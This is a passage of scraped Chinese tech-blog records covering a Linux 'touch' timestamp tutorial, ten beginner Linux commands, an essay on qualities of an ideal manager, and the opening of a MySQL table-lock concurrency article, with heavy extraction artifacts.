-\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# stat devops.txt, , ,File,:, ,'devops.txt', , ,Size,:, ,0,              , ,Blocks,:, ,0,         , ,IO ,Block,:, ,4096,  , ,regular ,empty ,file,Device,:, ,fd00h,/,64768d,   , ,Inode,:, ,67324178,   , ,Links,:, ,1,Access,:, ,(,0644,/,-,rw,-,r,--,r,--,), , ,Uid,:, ,(,   , ,0,/,   , ,root,),  , ,Gid,:, ,(,   , ,0,/,   , ,root,),Context,:, ,unconfined_u,:,object_r,:,admin_home_t,:,s0,Access,:, ,2018,-,03,-,29, ,23,:,03,:,10.902000000, ,-,0400,Modify,:, ,2018,-,03,-,29, ,23,:,59,:,49.106000000, ,-,0400,Change,:, ,2018,-,03,-,29, ,23,:,59,:,49.106000000, ,-,0400, ,Birth,:, ,-, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,同样的，我们可以改变一个目录的修改时间：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -m /mnt/nfsshare/\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -m /mnt/nfsshare/, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用 ,stat, 交叉验证访问和修改时间：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# stat devops.txt\r\n  File: 'devops.txt'\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324178    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2018-03-30 00:06:20.145000000 -0400\r\nModify: 2018-03-30 00:06:20.145000000 -0400\r\nChange: 2018-03-30 00:06:20.145000000 -0400\r\n Birth: -\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# stat devops.txt, , ,File,:, ,'devops.txt', , ,Size,:, ,0,              , ,Blocks,:, ,0,         , ,IO ,Block,:, ,4096,  , ,regular ,empty ,file,Device,:, ,fd00h,/,64768d,   , ,Inode,:, ,67324178,   , ,Links,:, ,1,Access,:, ,(,0644,/,-,rw,-,r,--,r,--,), , ,Uid,:, ,(,   , ,0,/,   , ,root,),  , ,Gid,:, ,(,   , ,0,/,   , ,root,),Context,:, ,unconfined_u,:,object_r,:,admin_home_t,:,s0,Access,:, ,2018,-,03,-,30, ,00,:,06,:,20.145000000, ,-,0400,Modify,:, ,2018,-,03,-,30, ,00,:,06,:,20.145000000, ,-,0400,Change,:, ,2018,-,03,-,30, ,00,:,06,:,20.145000000, ,-,0400, ,Birth,:, ,-, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,示例：7 将访问和修改时间设置为特定的日期和时间,\n,每当我们使用 ,touch, 命令更改文件和目录的访问和修改时间时，它将当前时间设置为该文件或目录的访问和修改时间。,\n,假设我们想要将特定的日期和时间设置为文件的访问和修改时间，这可以使用 ,touch, 命令中的 ,-c, 和 ,-t, 选项来实现。,\n,日期和时间可以使用以下格式指定：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n{CCYY}MMDDhhmm.ss\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,{,CCYY,},MMDDhhmm,.,ss, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其中：,\n,\n,CC, – 年份的前两位数字,\n,YY, – 年份的后两位数字,\n,MM, – 月份 (01-12),\n,DD, – 天 (01-31),\n,hh, – 小时 (00-23),\n,mm, – 分钟 (00-59),\n,\n,让我们将 ,devops.txt, 文件的访问和修改时间设置为未来的一个时间（2025 年 10 月 19 日 18 时 20 分）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -c -t 202510191820 devops.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -c -t 202510191820 devops.txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用 ,stat, 命令查看更新访问和修改时间：,\n,\n,根据日期字符串设置访问和修改时间，在 ,touch, 命令中使用 ,-d, 选项，然后指定日期字符串，后面跟文件名。如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -c -d \"2010-02-07 20:15:12.000000000 +0530\" sysadm-29.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -c -d \"2010-02-07 20:15:12.000000000 +0530\" sysadm-29.txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用 ,stat, 命令验证文件的状态：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# stat sysadm-20.txt\r\n  File: ‘sysadm-20.txt’\r\n  Size: 0               Blocks: 0          IO Block: 4096   regular empty file\r\nDevice: fd00h/64768d    Inode: 67324189    Links: 1\r\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\r\nContext: unconfined_u:object_r:admin_home_t:s0\r\nAccess: 2010-02-07 20:15:12.000000000 +0530\r\nModify: 2010-02-07 20:15:12.000000000 +0530\r\nChange: 2018-03-30 10:23:31.584000000 +0530\r\n Birth: -\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# stat sysadm-20.txt, , ,File,:, ,‘,sysadm,-,20.txt,’, , ,Size,:, ,0,              , ,Blocks,:, ,0,         , ,IO ,Block,:, ,4096,  , ,regular ,empty ,file,Device,:, ,fd00h,/,64768d,   , ,Inode,:, ,67324189,   , ,Links,:, ,1,Access,:, ,(,0644,/,-,rw,-,r,--,r,--,), , ,Uid,:, ,(,   , ,0,/,   , ,root,),  , ,Gid,:, ,(,   , ,0,/,   , ,root,),Context,:, ,unconfined_u,:,object_r,:,admin_home_t,:,s0,Access,:, ,2010,-,02,-,07, ,20,:,15,:,12.000000000, ,+,0530,Modify,:, ,2010,-,02,-,07, ,20,:,15,:,12.000000000, ,+,0530,Change,:, ,2018,-,03,-,30, ,10,:,23,:,31.584000000, ,+,0530, ,Birth,:, ,-, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,注意：,在上述命令中，如果我们不指定 ,-c,，如果系统中不存在该文件那么 ,touch, 命令将创建一个新文件，并将时间戳设置为命令中给出的。,\n,示例：8 使用参考文件设置时间戳（-r）,\n,在 ,touch, 命令中，我们可以使用参考文件来设置文件或目录的时间戳。假设我想在 ,devops.txt, 文件上设置与文件 ,sysadm-20.txt, 文件相同的时间戳，,touch, 命令中使用 ,-r, 选项可以轻松实现。,\n,语法：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# touch -r {参考文件} 真正文件\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# touch -r {参考文件} 真正文件, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi ~]# touch -r sysadm-20.txt devops.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi, ,~,],# touch -r sysadm-20.txt devops.txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,示例：9 在符号链接文件上更改访问和修改时间,\n,默认情况下，每当我们尝试使用 ,touch, 命令更改符号链接文件的时间戳时，它只会更改原始文件的时间戳。如果你想更改符号链接文件的时间戳，则可以使用 ,touch, 命令中的 ,-h, 选项来实现。,\n,语法：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# touch -h {符号链接文件}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# touch -h {符号链接文件}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[root@linuxtechi opt]# ls -l /root/linuxgeeks.txt\r\nlrwxrwxrwx. 1 root root 15 Mar 30 10:56 /root/linuxgeeks.txt -> linuxadmins.txt\r\n[root@linuxtechi ~]# touch -t 203010191820 -h linuxgeeks.txt\r\n[root@linuxtechi ~]# ls -l linuxgeeks.txt\r\nlrwxrwxrwx. 1 root root 15 Oct 19  2030 linuxgeeks.txt -> linuxadmins.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,root,@,linuxtechi ,opt,],# ls -l /root/linuxgeeks.txt,lrwxrwxrwx,., ,1, ,root ,root, ,15, ,Mar, ,30, ,10,:,56, ,/,root,/,linuxgeeks,.,txt, ,->, ,linuxadmins,.,txt,[,root,@,linuxtechi, ,~,],# touch -t 203010191820 -h linuxgeeks.txt,[,root,@,linuxtechi, ,~,],# ls -l linuxgeeks.txt,lrwxrwxrwx,., ,1, ,root ,root, ,15, ,Oct, ,19, , ,2030, ,linuxgeeks,.,txt, ,->, ,linuxadmins,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这就是本教程的全部了。我希望这些例子能帮助你理解 ,touch, 命令。请分享你的宝贵意见和评论。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113946/", "url_object_id": "766014fa163647d49d5408eaf8fada6b", "front_image_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "title": "每个 Linux 新手都应该知道的 10 个命令", "create_time": "2018/05/04", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Sam Bocetta,   译文出处：,Linux中国/MjSeven,   ,通过这 10 个基础命令开始掌握 Linux 命令行。,\n,你可能认为你是 Linux 新手，但实际上并不是。全球互联网用户有 ,3.74 亿,，他们都以某种方式使用 Linux，因为 Linux 服务器占据了互联网的 90%。大多数现代路由器运行 Linux 或 Unix，,TOP500 超级计算机, 也依赖于 Linux。如果你拥有一台 Android 智能手机，那么你的操作系统就是由 Linux 内核构建的。,\n,换句话说，Linux 无处不在。,\n,但是使用基于 Linux 的技术和使用 Linux 本身是有区别的。如果你对 Linux 感兴趣，但是一直在使用 PC 或者 Mac 桌面，你可能想知道你需要知道什么才能使用 Linux 命令行接口（CLI），那么你来到了正确的地方。,\n,下面是你需要知道的基本的 Linux 命令。每一个都很简单，也很容易记住。换句话说，你不必成为比尔盖茨就能理解它们。,\n,1、 ls,\n,你可能会想：“这是（is）什么东西？”不，那不是一个印刷错误 —— 我真的打算输入一个小写的 l。,ls,，或者说 “list”， 是你需要知道的使用 Linux CLI 的第一个命令。这个 list 命令在 Linux 终端中运行，以显示在存放在相应文件系统下的所有主要目录。例如，这个命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nls /applications\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,ls, ,/,applications, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,显示存储在 ,applications, 文件夹下的每个文件夹，你将使用它来查看文件、文件夹和目录。,\n,显示所有隐藏的文件都可以使用命令 ,ls -a,。,\n,2、 cd,\n,这个命令是你用来跳转（或“更改”）到一个目录的。它指导你如何从一个文件夹导航到另一个文件夹。假设你位于 ,Downloads, 文件夹中，但你想到名为 ,Gym Playlist, 的文件夹中，简单地输入 ,cd Gym Playlist, 将不起作用，因为 shell 不会识别它，并会报告你正在查找的文件夹不存在（LCTT 译注：这是因为目录名中有空格）。要跳转到那个文件夹，你需要包含一个反斜杠。改命令如下所示：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncd Gym\\ Playlist\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,cd ,Gym,\\, ,Playlist, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要从当前文件夹返回到上一个文件夹，你可以在该文件夹输入 ,cd ..,。把这两个点想象成一个后退按钮。,\n,3、 mv,\n,该命令将文件从一个文件夹转移到另一个文件夹；,mv, 代表“移动”。你可以使用这个简单的命令，就像你把一个文件拖到 PC 上的一个文件夹一样。,\n,例如，如果我想创建一个名为 ,testfile, 的文件来演示所有基本的 Linux 命令，并且我想将它移动到我的 ,Documents, 文件夹中，我将输入这个命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmv /home/sam/testfile /home/sam/Documents/\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,mv, ,/,home,/,sam,/,testfile, ,/,home,/,sam,/,Documents,/, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,命令的第一部分（,mv,）说我想移动一个文件，第二部分（,home/sam/testfile,）表示我想移动的文件，第三部分（,/home/sam/Documents/,）表示我希望传输文件的位置。,\n,4、 快捷键,\n,好吧，这不止一个命令，但我忍不住把它们都包括进来。为什么？因为它们能节省时间并避免经历头痛。,\n,\n,CTRL+K, 从光标处剪切文本直至本行结束,\n,CTRL+Y, 粘贴文本,\n,CTRL+E, 将光标移到本行的末尾,\n,CTRL+A, 将光标移动到本行的开头,\n,ALT+F, 跳转到下一个空格处,\n,ALT+B, 回到前一个空格处,\n,ALT+Backspace, 删除前一个词,\n,CTRL+W, 剪切光标前一个词,\n,Shift+Insert, 将文本粘贴到终端中,\n,Ctrl+D, 注销,\n,\n,这些命令在许多方面都能派上用场。例如，假设你在命令行文本中拼错了一个单词：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt-get intall programname\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt,-,get ,intall ,programname, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你可能注意到 ,install, 拼写错了，因此该命令无法工作。但是快捷键可以让你很容易回去修复它。如果我的光标在这一行的末尾，我可以按下两次 ,ALT+B, 来将光标移动到下面用 ,^, 符号标记的地方：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt-get^intall programname\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt,-,get,^,intall ,programname, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在，我们可以快速地添加字母 ,s, 来修复 ,install,，十分简单！,\n,5、 mkdir,\n,这是你用来在 Linux 环境下创建目录或文件夹的命令。例如，如果你像我一样喜欢 DIY，你可以输入 ,mkdir DIY, 为你的 DIY 项目创建一个目录。,\n,6、 at,\n,如果你想在特定时间运行 Linux 命令，你可以将 ,at, 添加到语句中。语法是 ,at, 后面跟着你希望命令运行的日期和时间，然后命令提示符变为 ,at>,，这样你就可以输入在上面指定的时间运行的命令。,\n,例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nat 4:08 PM Sat\r\nat> cowsay 'hello'\r\nat> CTRL+D\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,at, ,4,:,08, ,PM ,Sat,at,>, ,cowsay, ,'hello',at,>, ,CTRL,+,D, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这将会在周六下午 4:08 运行 ,cowsay, 程序。,\n,7、 rmdir,\n,这个命令允许你通过 Linux CLI 删除一个目录。例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nrmdir testdirectory\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,rmdir ,testdirectory, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,请记住，这个命令不会删除里面有文件的目录。这只在删除空目录时才起作用。,\n,8、 rm,\n,如果你想删除文件，,rm, 命令就是你想要的。它可以删除文件和目录。要删除一个文件，键入 ,rm testfile,，或者删除一个目录和里面的文件，键入 ,rm -r,。,\n,9、 touch,\n,touch, 命令，也就是所谓的 “make file 的命令”，允许你使用 Linux CLI 创建新的、空的文件。很像 ,mkdir, 创建目录，,touch, 会创建文件。例如，,touch testfile, 将会创建一个名为 testfile 的空文件。,\n,10、 locate,\n,这个命令是你在 Linux 系统中用来查找文件的命令。就像在 Windows 中搜索一样，如果你忘了存储文件的位置或它的名字，这是非常有用的。,\n,例如，如果你有一个关于区块链用例的文档，但是你忘了标题，你可以输入 ,locate -blockchain, 或者通过用星号分隔单词来查找 “blockchain use cases”，或者星号（,*,）。例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nlocate -i*blockchain*use*cases*\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,locate, ,-,i*,blockchain*,use,*,cases*, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,还有很多其他有用的 Linux CLI 命令，比如 ,pkill, 命令，如果你开始关机但是你意识到你并不想这么做，那么这条命令很棒。但是这里描述的 10 个简单而有用的命令是你开始使用 Linux 命令行所需的基本知识。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113942/", "url_object_id": "5e2d42904ac3f58401f4bcdd5d04bac1", "front_image_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/07/20120717_161512_1.jpg"], "title": "GitHub 工程师：我眼中的理想上司是这样子的", "create_time": "2018/05/09", "vote": "1", "bookmark": "3", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,刘唱, 翻译。未经许可，禁止转载！,英文出处：,Keavy,。欢迎加入,翻译组,。,我是 Github 的一名高级工程师。我不是要找工作，只是一直在思考领导能力的问题，思考在我多年共事过的诸多领导之中，我最欣赏的特质是什么。受到 Chad Fowler 的文章《,我想雇什么样的员工,》的启发，我也开始留意我想为什么样的领导工作，即——理想的领导是什么样。,\n,\n,在分享我的看法之前，先让我简单介绍一下我自己的情况：,\n,我是一名经验丰富的工程师，做过很多基础架构的工作，同时在我的专业领域（API 及其生态环境）扮演着技术顾问的角色。我是个不太需要监督指导的人，我老板只要指出问题的大方向，就可以放手让我去完成了。我很乐意解决困难的工程问题，带领团队朝一个方向努力，或是帮助公司与公众就一个项目进行沟通。正如一个同事所言：我就是“擅长搞定麻烦事”。,\n,以下是我认为作为一个理想的领导者应有的特质：,\n,\n,在工作中明显地表现出冷静和自在，了解你的态度和行为会对周围的人产生哪些影响，非常关注如何营造出一种相互支持的工作环境。,\n,\n,\n,工作是生活的一部分，拥有健康的工作时间，会休假。即使你自己选择在常规工作时间以外工作，也不期待别人和你一样，不干扰其他人的工作习惯。,\n,\n,\n,无论与谁谈话都在场。,\n,\n,\n,善于倾听。,\n,\n,\n,基于自己和团队的价值，会经过深思熟虑精心设计工作流程，因为你重视他人的参与和时间，因此不会为了走流程而增加流程。,\n,\n,\n,当你要提出批评性的建议的时候，会及时并且私下沟通。会提供具体的细节，并给出改进的建议和所需的支持。当你有积极的反馈意见时，也会提供具体的细节，并以别人喜欢被认可的方式分享出来。,\n,\n,\n,足够自信，乐于接受其他人对你工作和方法的反馈。足够谦虚，在你有不懂的时候、犯错的时候或是学到新东西的时候随时承认。享受从周围人身上学习新知识的过程。,\n,\n,\n,对公司的情况有深刻透彻的理解，利用已知的信息指导员工如何工作可以创造出最大的价值，为用户和公司带来最好的影响。,\n,\n,\n,不害怕质疑和否认自己的领导，或是挑战公司的现状。,\n,\n,\n,允许并支持你的员工在划定的范围内自己做决定，即使你可能不会做同样的决定。,\n,\n,\n,无论是大型还是小型的任务、新特性还是常规维护，重视他人的工作。经常强调这一点，让每个人都知道你重视他和他的工作成果。无论在何时何地都能培养一种信任的文化。,\n,\n,\n,能够意识到使没受重视的人群被边缘化的行为，即使这些行为是微不足道的，也可能是出于潜意识的。意识到这些事所造成的情感上的伤害。当这种情况出现时，能迅速采取行动解决问题。,\n,\n,\n,知道科技领域实际上并不是精英政治（根据个人才能和功绩分配权力），多留意在工作中谁创造了最多的价值，谁最积极主动，确保他们受到关注，拥有更多特权。同样，留意谁在工作中遇到了困难，努力纠正其中的不平等。,\n,\n,\n,观察大家在日常沟通和正式场合谈论事情有何不同。知道存在对女性和有色人种的系统性偏见，努力保证你的员工在相处和评估时不受到此类歧视。,\n,\n,\n,利用自己的特权帮助员工成长，积极赞助员工：使他们融入团队，看到他们的努力，让他们得到提拔。,\n,\n,\n,不只是期待员工做出最完美的工作，还要信任并赋予他们做好工作的权力。给予员工接受并完成新挑战所需的支持。,\n,\n,\n,不接受平庸。如果你尽了最大的努力，但是员工还是滥竽充数，那他们必须离开。,\n,\n,\n,尽管承担着很多责任和利益相关，仍然着眼于如何让员工更轻松地产出最佳工作成果。,\n,\n,\n,能注意到有人在工作中感到沮丧、无聊或是很吃力。无论他们主动告诉你的还是你感觉到的，抽出点时间关心他们，倾听其中的原因。,\n,\n,从我的观点来看，以上这些都很重要。,\n,如果我描述的这些你都符合，我想你会成为一个好榜样，培养出一个互相支持，态度积极而又忠诚的团队。你能让员工的生活变得更好，理由很简单，你真正地关心着你的员工。,\n\r\n        \r\n            ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n        , 打赏译者,\n    ,\n\n    ,\n        ,打赏支持我翻译更多好文章，谢谢！,\n                ,\n                        ,\n            \n                    ,\n    ,\n\n    \r\n        \n    ,\n        , ,1, 赞,\n        , 3 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,刘唱,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            数据挖掘研究生        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 37, · , ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113956/", "url_object_id": "6a9a2f2ed164a2490d1813a3bb30a2b5", "front_image_path": "full/428bcfd6bd490b0c39a551086995565641acf804.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/11/e78e36715813f49e9e62fe0c6050075c.png"], "title": "MySQL 在并发场景下的问题及解决思路", "create_time": "2018/05/11", "vote": "1", "bookmark": "3", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,李平,   ,1、背景,\n,对于数据库系统来说在多用户并发条件下提高并发性的同时又要保证数据的一致性一直是数据库系统追求的目标，既要满足大量并发访问的需求又必须保证在此条件下数据的安全，为了满足这一目标大多数数据库通过锁和事务机制来实现，MySQL数据库也不例外。尽管如此我们仍然会在业务开发过程中遇到各种各样的疑难问题，本文将以案例的方式演示常见的并发问题并分析解决思路。,\n,2、表锁导致的慢查询的问题,\n,首先我们看一个简单案例，根据ID查询一条用户信息：,\n,mysql> select * from user where id=6;,\n,这个表的记录总数为3条，但却执行了13秒。,\n,\n,出现这种问题我们首先想到的是看看当前MySQL进程状态：,\n,\n,从进程上可以看出select语句是在等待一个表锁，那么这个表锁又是什么查询产生的呢？这个结果中并没有显示直接的关联关系，但我们可以推测多半是那条update语句产生的（因为进程中没有其他可疑的SQL），为了印证我们的猜测，先检查一下user表结构：,\n,\n,果然user表使用了MyISAM存储引擎，MyISAM在执行操作前会产生表锁，操作完成再自动解锁。如果操作是写操作，则表锁类型为写锁，如果操作是读操作则表锁类型为读锁。正如和你理解的一样写锁将阻塞其他操作(包括读和写)，这使得所有操作变为串行；而读锁情况下读-读操作可以并行，但读-写操作仍然是串行。以下示例演示了显式指定了表锁（读锁），读-读并行，读-写串行的情况。,\n,显式开启/关闭表锁，使用lock table user read/write; unlock 